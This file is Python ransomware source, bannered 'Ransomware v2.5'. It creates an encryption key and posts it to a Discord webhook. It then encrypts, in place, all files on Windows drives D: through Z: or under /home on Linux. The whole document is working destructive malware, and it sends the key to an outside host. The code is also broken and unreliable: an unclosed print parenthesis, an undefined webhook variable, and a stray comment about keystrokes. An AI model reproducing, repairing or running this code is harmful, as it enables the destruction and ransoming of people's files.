import os
import time
import threading
from cryptography.fernet import Fernet
import requests
import configparser

print('''
,-.                                         
|  )                                        
|-<  ,-: ;-. ,-. ,-. ;-.-. , , , ,-: ;-. ,-.
|  \ | | | | `-. | | | | | |/|/  | | |   |-'
'  ' `-` ' ' `-' `-' ' ' ' ' '   `-` '   `-'
v2.5
Copyright: @ALHARAM 
'''
# Load configuration from config.conf
config = configparser.ConfigParser()
config.read('config.conf')

WEBHOOK_URL = config['settings']['webhook_url']

# Function to send keystrokes to Discord via webhook
def send_to_discord(message):
    data = {'content': message}
    requests.post(DISCORD_WEBHOOK_URL, data=data)


def encrypt_file(file, cipher):
    """Encrypt a single file."""
    try:
        with open(file, 'rb') as thefile:
            contents = thefile.read()
        contents_encrypted = cipher.encrypt(contents)
        with open(file, 'wb') as thefile:
            thefile.write(contents_encrypted)
        print(f"[*] Encrypted: {file}")
    except Exception as e:
        return
    

def collect_files_windows():
    """Collect all files for encryption on Windows, except in C:\\ drive."""
    files = []
    for drive in 'DEFGHIJKLMNOPQRSTUVWXYZ':  # All potential drives
        drive_path = f"{drive}:\\"
        if os.path.exists(drive_path):
            for dirpath, _, filenames in os.walk(drive_path):
                for filename in filenames:
                    # Skip specified files and hidden files
                    if filename in {"encrypt.py", "thekey.key", "decrypt.py"} or filename.startswith('.'):
                        continue
                    file_path = os.path.join(dirpath, filename)
                    files.append(file_path)
    return files


def collect_files_linux():
    """Collect all files for encryption in /home directory on Linux."""
    files = []
    for dirpath, _, filenames in os.walk('/home'):
        for filename in filenames:
            # Skip specified files and hidden files
            if filename in {"encrypt.py", "thekey.key", "decrypt.py"} or filename.startswith('.'):
                continue
            file_path = os.path.join(dirpath, filename)
            files.append(file_path)
    return files

key = Fernet.generate_key()
cipher = Fernet(key)
send_to_discord(key)
# Determine the root directories to encrypt based on the operating system
if os.name == 'nt':  # Windows
    files_to_encrypt = collect_files_windows()
else:  # Linux (Kali)
    files_to_encrypt = collect_files_linux()

# Start the encryption process
start_time = time.time()
threads = []
for file in files_to_encrypt:
    thread = threading.Thread(target=encrypt_file, args=(file, cipher))
    thread.start()
    threads.append(thread)

# Wait for threads to complete
for thread in threads:
    thread.join()

end_time = time.time()
print(f"Encryption process completed in {end_time - start_time:.2f} seconds.")
